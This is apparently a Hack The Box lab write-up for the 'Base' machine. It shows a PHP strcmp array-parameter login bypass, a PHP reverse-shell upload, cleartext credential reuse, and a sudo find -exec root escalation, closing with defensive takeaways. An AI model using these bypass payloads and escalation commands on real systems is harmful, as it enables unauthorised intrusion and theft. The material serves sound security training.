# Base

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | PHP type-juggling auth bypass (strcmp), unrestricted upload, credential reuse, sudo find (GTFOBins) |

## Overview
The login compares the password with `strcmp()` loosely compared to `0`. Passing the
params as arrays makes `strcmp` return `NULL`, and `NULL == 0` is true, so auth is
bypassed. An unrestricted upload gives a www-data shell, cleartext creds in `config.php`
are reused for a system user, and a sudo-able `find` gives root.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 22,80 <TARGET_IP>
gobuster dir -u http://<TARGET_IP>/ -w .../common.txt -x php,txt,swp,bak
# a leftover source/swap file reveals the strcmp() password check in /login/
```

## Exploitation (auth bypass)
Catch the login POST in Burp and make both parameters arrays:
```
username[]=admin&password[]=password
# response: Location: /upload.php
```
`strcmp(array, string)` returns `NULL`; the code's `== 0` check then passes. Upload a PHP
reverse shell via `/upload.php`, trigger it at `/uploads/`, land as www-data, then:
```bash
cat /var/www/html/login/config.php         # admin:thisisagoodpassword (cleartext)
su john                                     # password reused for the system user
```

## Privilege Escalation
```bash
sudo -l                                     # (root) /usr/bin/find
sudo /usr/bin/find . -exec /bin/sh \; -quit # GTFOBins -> root
```

## Key Takeaway
Never compare secrets with loose `==`/`strcmp`; use `hash_equals()`/`password_verify()`
and validate that input is a string. Do not leave editor swap/backup files in the web
root. Validate uploads. Scope sudo tightly, `find` with sudo is full root via `-exec`.

## What tripped me up
After the bypass I kept getting bounced back to the login because the bypass
authenticated one specific session, and my browser held a different `PHPSESSID`. Syncing
the browser cookie to the authenticated session fixed it and reaching `/upload.php`
worked. A small, realistic detail about how PHP session handling actually works.
